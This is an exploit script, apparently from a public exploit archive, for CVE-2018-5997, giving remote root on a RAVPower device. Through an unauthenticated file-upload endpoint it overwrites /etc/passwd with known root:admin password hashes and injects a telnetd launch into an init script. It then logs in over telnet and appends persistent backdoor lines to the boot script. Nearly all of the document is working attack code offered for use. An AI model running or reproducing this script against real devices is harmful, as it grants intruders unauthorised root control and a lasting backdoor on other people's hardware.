"""

# Exploit Title: RAVPower - remote root
# Date: 23/01/2018
# Exploit Authors: Daniele Linguaglossa
# Vendor Homepage: https://www.ravpower.com/
# Software Link: https://www.ravpower.com/
# Version: 2.000.056
# Tested on: OSX
# CVE : CVE-2018-5997

"""

import requests
import time
import telnetlib


PATH_PASSWD = "/etc"
FILE_PASSWD = "passwd"
PATH_VSTFUNC = "/etc/init.d"
FILE_VSTFUNC = "vstfunc"
FILE_RC = "/etc/rc.d/rc"
BACKDOOR_TERM = "export TERM=xterm"
BACKDOOR_TELNET = "/usr/sbin/telnetd &"
BASH_SHEBANG = "#!/bin/sh"
TELNETD = "/usr/sbin/telnetd -p 1111 &"


def upload(host, port, path, name, content):
    user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0"
    path = "/upload.csp?uploadpath=%s&file=1515865637281" % path
    url ="http://{0}:{1}{2}".format(host,port,path)
    files = {'file' : ('%s' % name, content,'application/octet-stream')}
    headers = {
        "user-agent": user_agent
    }
    try:
        requests.post(url,headers=headers,files=files)
        return True
    except:
        return False


# root:admin
tmp_passwd = """root:$1$YBm5LfCo$5OEwLPLUu085z5EoDpQz7/:0:0:root:/data/UsbDisk1/Volume1:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
admin:$1$QlrmwRgO$c0iSI2euV.U1Wx6yBkDBI.:15:0:admin:/data/UsbDisk1/Volume1:/bin/sh
mail:*:8:8:mail:/var/mail:/bin/sh
nobody:x:65534:65534:Nobody:/data/UsbDisk1/Volume1:/bin/sh
guest:$1$QlrmwRgO$c0iSI2euV.U1Wx6yBkDBI.:512:0:guest:/data/UsbDisk1/Volume1/Share:/bin/sh-new
"""

tmp_vstfunc = """
export PATH=/bin:/sbin:/usr/bin:/usr/sbin
# A function to stop a program.
killproc() {
	local base=${1##*/}
        local pid=
        pid=`pidof $base`
	local i
        if [ -n "$pid" ]; then
		for i in $pid ; do
			kill -KILL $i > /dev/null 2>&1
		done
        fi
    	rm -f /var/run/$base.pid
    	return 0
}
# A function to find the pid of a program.
pidofproc() {
	local base=${1##*/}
	#First try "/var/run/*.pid" files
	if [ -f "/var/run/$base.pid" ]; then
	        local line p pid=
		read line < /var/run/$base.pid
		for p in $line ; do
		       [ -z "$p" -a -d "/proc/$p" ] && pid="$pid $p"
		done
	else
		pid=`pidof $1 || pidof $base`
	fi
	if [ -n "$pid" ]; then
                echo $pid
                return 0
        fi
	return 1
}
# Check if $pid (could be plural) are running
# Return : 0 run
#          1 stop
checkpid() {
	local i
	for i in $* ; do
		if [ -d "/proc/$i" ]; then
			 return 0
		fi
	done
	return 1
}
# Check disk exist
checkdisk() {
        return $?
}
# save pid and log function
savesc() {
	local i=0
    if [ -n "$3" ]; then
        touch /var/run/$3.pid
    fi
    return $?
}

# A function check start of a program.
# return: 1  not exist
#         0  exist
checkonly() {
        local prgname=${1##*/}
        local pid=
        if [ -f "/var/run/$prgname.pid" ]; then
            pid=`pidof $prgname`
            if [ -n "$pid" ]; then
                return 0
            fi
            return 1
        else
            pid=`pidof $prgname`
            if [ -n "$pid" ]; then
                if sleep 1 && checkpid $pid && sleep 1 && checkpid $pid && sleep 2 && checkpid $pid ; then
                    return 2
                fi
            fi
            return 2
        fi

}
# A function save etc to mtd.
# return: 1 failure
#         0 success
saveetc() {
        local ret=0

	/usr/sbin/etc_tools t > /dev/null 2>&1
	let ret=ret+$?
#	ret=$[$ret + $?]
	/usr/sbin/etc_tools p > /dev/null 2>&1
	let ret=ret+$?
#	ret=$[$ret + $?]

	return $ret
}
# A function resume mtd to etc.
# return: 1 failure
#         0 success
resumeetc() {
        local ret=0

	/usr/sbin/etc_tools b > /dev/null 2>&1
	let ret=ret+$?
#	ret=$[$ret + $?]
	/usr/sbin/etc_tools u > /dev/null 2>&1
	let ret=ret+$?
#	ret=$[$ret + $?]

	return $ret
}

# Create a lock for /var/lock
AppScriptLock() {
	if [ -f /var/lock/$1.pid ]; then
		return 0
	else
		touch /var/lock/$1.pid
		return 1
	fi
}

# Check a lock for /var/lock
AppScriptChkLock() {
	if [ -f /var/lock/$1.pid ]; then
		return 1
	else
		return 0
	fi
}

# Delete a lock for /var/lock
AppScriptUnlock() {
	if [ -f /var/lock/$1.pid ]; then
		rm -rf /var/lock/$1.pid
	fi
	return 1
}

DISKPATH="/data/UsbDisk1/Volume1/.vst/upgrade"
ETCPATH="/boot/tmp"
ETCBKPATH="/boot/tmp/etcbackup"
DISKETCFILE="/data/UsbDisk1/Volume1/.vst/upgrade/etc.tar"
DIDKETCBKFILE="/data/UsbDisk1/Volume1/.vst/upgrade/etcbackup.tar.gz"
ETCFILE="/boot/tmp/etc.tar"
ETCBKFILETAR="/boot/tmp/etcbackup.tar"
ETCBKFILE="/boot/tmp/etcbackup.tar.gz"
FILELIST="hostname passwd shadow samba/smbpasswd fileserv/lighttpd.user dropbox baidu"
FILELIST1="hostname"
backup_etc() {
	rm $ETCBKFILETAR -rf
        rm $ETCBKFILE -rf
        rm $ETCBKPATH -rf

        #	if [ ! -e $DISKPATH ];then
         #       	mkdir -p -m 755 $DISKPATH
        #	fi
		if [ ! -e $ETCBKPATH ]; then
			mkdir -p -m 755 $ETCBKPATH
		fi
if [ -z $1 ]; then
	FILELISTALL=$FILELIST
else
	if [ $1 == "resume" ]; then
		FILELISTALL=$FILELIST1
	fi
fi
		for f in $FILELISTALL
                do
                        if [ -d /etc/$f ]; then
                                cp -rf /etc/$f $ETCBKPATH > /dev/null 2>&1
                        else
                                if [ "$f" == "samba/smbpasswd" ]; then
                                        if [ ! -e $ETCBKPATH/samba ]; then
                                                mkdir -p $ETCBKPATH/samba
                                        fi
                                        cp -rf /etc/$f $ETCBKPATH/$f > /dev/null 2>&1
                                elif [ "$f" == "fileserv/lighttpd.user" ]; then
                                        if [ ! -e $ETCBKPATH/fileserv ]; then
                                                mkdir -p $ETCBKPATH/fileserv
                                        fi
                                        cp -rf /etc/$f $ETCBKPATH/$f > /dev/null 2>&1
                                elif [ "$f" == "serversman/cloud.conf" ]; then
                                        if [ ! -f /etc/$f ]; then
                                                continue
                                        fi
                                        if [ ! -e $ETCBKPATH/serversman ]; then
                                                mkdir -p $ETCBKPATH/serversman
                                        fi
                                        cp -rf /etc/$f $ETCBKPATH/$f > /dev/null 2>&1
                                else
                                	cp -rf /etc/$f $ETCBKPATH > /dev/null 2>&1
				fi
                        fi
                done
		tar cvf $ETCBKFILETAR $ETCBKPATH > /dev/null 2>&1
		gzip $ETCBKFILETAR
		if [ -f $ETCBKFILE ]; then
			cp -rf $ETCBKFILE $DIDKETCBKFILE
		fi
}


backup_etc_telnet() {
	rm $ETCBKFILETAR -rf
        rm $ETCBKFILE -rf
        rm $ETCBKPATH -rf

        #	if [ ! -e $DISKPATH ];then
         #       	mkdir -p -m 755 $DISKPATH
        #	fi
		if [ ! -e $ETCBKPATH ]; then
			mkdir -p -m 755 $ETCBKPATH
		fi
if [ -z $1 ]; then
	FILELISTALL=$FILELIST
else
	if [ $1 == "resume" ]; then
		FILELISTALL=$FILELIST1
	fi
fi
		touch $ETCBKPATH/telnetflag
		tar cvf $ETCBKFILETAR $ETCBKPATH > /dev/null 2>&1
		gzip $ETCBKFILETAR
		if [ -f $ETCBKFILE ]; then
			cp -rf $ETCBKFILE $DIDKETCBKFILE
		fi
}









restore_etc() {
		if [ -f $ETCBKFILE ]; then
			gunzip $ETCBKFILE
			tar xvf $ETCBKFILETAR -C / > /dev/null 2>&1
			for f in $FILELIST
			do
                        	if [ -d /etc/$f ]; then
					echo cp -rf $ETCBKPATH/$f /etc/$f >> /tmp/restore_etc
                                	#cp -rf $ETCBKPATH/$f /etc/$f > /dev/null 2>&1
                                	cp -rf $ETCBKPATH/$f /etc > /dev/null 2>&1
                        	else
                                	if [ "$f" == "samba/smbpasswd" ]; then
						echo cp -rf $ETCBKPATH/$f /etc/$f >> /tmp/restore_etc
                                        	cp -rf $ETCBKPATH/$f /etc/$f > /dev/null 2>&1
                                	elif [ "$f" == "fileserv/lighttpd.user" ]; then
						echo cp -rf $ETCBKPATH/$f /etc/$f >> /tmp/restore_etc
                                        	cp -rf $ETCBKPATH/$f /etc/$f > /dev/null 2>&1
                                        elif [ "$f" == "serversman/cloud.conf" ]; then
                                                if [ ! -f $ETCBKPATH/$f ]; then
                                                        continue
                                                fi
                                                echo cp -rf $ETCBKPATH/$f /etc/$f >> /tmp/restore_etc
                                                cp -rf $ETCBKPATH/$f /etc/$f > /dev/null 2>&1
                                	else
						echo cp -rf $ETCBKPATH/$f /etc/$f >> /tmp/restore_etc
						cp -rf $ETCBKPATH/$f /etc/$f > /dev/null 2>&1
					fi
				fi
			done
			if [ -f $ETCBKPATH/telnetflag ]; then
				touch /etc/telnetflag
			fi
		fi
}

# A function check usb flag
# return: 0 service start
#         1 service stop
check_usb_flag() {
        local ret=0

        if [ -e "/proc/usbwrite" ];then
                ret=`cat /proc/usbwrite`
        fi

        return $ret
}

###########################################################################
#
# LED operations
#
###########################################################################
led_wink_start() {
	LED=`cat /proc/vsled`
	if [ $LED -eq 3 ]; then
		pioctl wifi 2
	fi
}
led_wink_stop() {
	LED=`cat /proc/vsled`
	if [ $LED -eq 2 ]; then
		pioctl wifi 3
	fi
}
led_wink_chk() {
	LED=`cat /proc/vsled`
	if [ $LED -eq 2 ]; then
		return 1
	else
		return 0
	fi
}

###########################################################################
#
# Flag operation
#
###########################################################################
flagctl_get() {
	if [ -e /dev/sda ]; then
		trynum=0
		while [ $trynum -lt 3 ]; do
			retval=`/usr/sbin/flagctl disk get $1`
			if [ ! -z $retval ]; then
				return $retval
			fi
			let trynum=trynum+1
#			trynum=$[$trynum+1]
			sleep 1
		done
	fi
}

flagctl_set() {
	if [ -e /dev/sda ]; then
		trynum=0
		while [ $trynum -lt 3 ]; do
			/usr/sbin/flagctl disk set $1 $2
			flagctl_get $1
			if [ "$?" -eq "$2" ]; then
				sync
				return 1
			fi
			let trynum=trynum+1
#			trynum=$[$trynum+1]
			sleep 1
		done
	fi
	return 0
}

###########################################################################
#
# string function
#
###########################################################################
str_func_strstr () {
	if [ ${#2} -eq 0 ];then
		echo "$1"
		return 0
	fi
	case "$1" in
		*$2*)
			return 1
			;;
		*)
			return 0
			;;
	esac
}

dev_test_host() {
	nordev=`echo $1 | cut -c -3`
	s_str=`ls -l /sys/block/$nordev/device`
	str_func_strstr "$s_str" "host0"
	if [ $? -eq 1 ]; then
		return 1
	fi
	return 0;
}

dev_test_usb() {
        nordev=`echo $1 | cut -c -3`
        s_str=`ls -l /sys/block/$nordev/device`
        str_func_strstr "$s_str" "usb"
        if [ $? -eq 1 ]; then
                return 1
        fi
        return 0;
}

###########################################################################
#
# Permission check functions
#
###########################################################################
# $1: device name
# $2: host/usb
# $3: if recursive, 1: enable, 0: disable
perm_change_start() {
	permpid=`ps | grep "/usr/sbin/permchange $1" | cut -d' ' -f2`
	if [ ! -z $permpid ]; then
		return 1;
	else
		/usr/sbin/permchange $1 $2 $3 &
	fi
}

# $1: device name
# $2: if recursive, 1: enable, 0: disable
perm_chk_start() {
	dev_test_host $1
	if [ $? -eq 1 ]; then
		perm_change_start $1 host $2
	else
		perm_change_start $1 usb $2
	fi
}

perm_chk_stop() {
	permpid=`ps | grep "/usr/sbin/permchange $1" | cut -d' ' -f2`
	if [ ! -z $permpid ]; then
		for ppid in $permpid ; do
			kill -9 $ppid > /dev/null 2>&1
		done
	fi
}

###########################################################################
# Time function
###########################################################################
timedate_settosys() {
	if [ -e /etc/timedate ]; then
        	TIMESET=`cat /etc/timedate`
        	date -s $TIMESET
	fi
}

timedate_save() {
	date '+%Y.%m.%d-%H:%M:%S' > /etc/timedate
}
"""
print "RAVPower Remote root (0day) - By dzonerzy & r3dx0f\n\n"
host = raw_input("Insert Ravpower IP: ")
print "[*] Step 1 -> pwning /etc/passwd"
if not upload(host, 80,PATH_PASSWD,FILE_PASSWD,tmp_passwd):
    print "[-] Filed to pwn /etc/passwd maybe fixed?"
    exit(0)
print "[*] Step 2 -> pwning /etc/init.d/vstfunc"
if not upload(host, 80,PATH_VSTFUNC,FILE_VSTFUNC,BASH_SHEBANG+"\n"+TELNETD+"\n"+tmp_vstfunc):
    print "[-] Filed to pwn /etc/init.d/vstfunc maybe fixed?"
    exit(0)
t = None
print "[*] Step 3 -> Try to remove or insert SD Card or just wait for something happen (something must happen!)"
while True:
    try:
        print "[*] Step 3-1 -> Trying to telnet..."
        t = telnetlib.Telnet(host, port=1111)
        break
    except:
        time.sleep(5)
t.read_until(": ")
t.write("root\n")
t.read_until(": ")
t.write("admin\n")
t.read_until("# ")
print "[*] Step 4 -> pwning /etc/rc.d/rc"
t.write("echo '%s' >> %s\n" % (BACKDOOR_TERM, FILE_RC))
t.read_until("# ")
t.write("echo '%s' >> %s\n" % (BACKDOOR_TELNET, FILE_RC))
t.read_until("# ")
print "[*] Step 4-1 -> pwned!"
print "[*] Step 5 -> Saving settings"
t.write("/usr/sbin/etc_tools p\n")
t.read_until("# ")
print "[*] Step 5-1 -> Done!"
print "[*] Step 6 -> Starting telnetd"
t.write("/usr/sbin/telnetd &\n")
t.read_until("# ")
print "[*] Step 6-1 -> Done!"
print "[*] Step 7 -> Killing old telnet"
t.write("ps aux   |grep 1111  | awk '{print $2}' | xargs kill -9\n")
t.read_until("# ")
print "[*] Step 7-1 -> Done!"
print "[*] Step 8 -> Restoring vstfunc"
if not upload(host, 80,PATH_VSTFUNC,FILE_VSTFUNC,BASH_SHEBANG+"\n"+tmp_vstfunc):
    print "[-] Filed to pwn /etc/init.d/vstfunc fixed?"
    exit(0)
print "[*] Step 8-1 -> Done!"
print "[!] PWNAGE COMPLETED! connect with root:admin"